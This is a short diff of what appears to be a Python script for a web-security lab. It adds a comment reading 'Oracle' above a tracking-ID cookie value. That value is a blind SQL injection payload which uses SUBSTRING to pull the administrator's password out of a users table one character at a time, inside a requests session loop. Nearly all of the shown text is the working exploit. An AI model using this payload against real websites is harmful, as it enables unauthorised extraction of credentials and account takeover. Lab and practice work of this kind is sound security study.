@@ -5,6 +5,7 @@ BASE_URL = ''
 PATH = ''
 
 # SQLi in Tracking ID of website
+# Oracle
 TRACKING_ID = "MfI1Ftgs9J7FJLIl' AND SUBSTRING((SELECT Password FROM users WHERE Username = 'administrator'), {char_no}, 1) = '{letter}"
 
 with Session() as s:
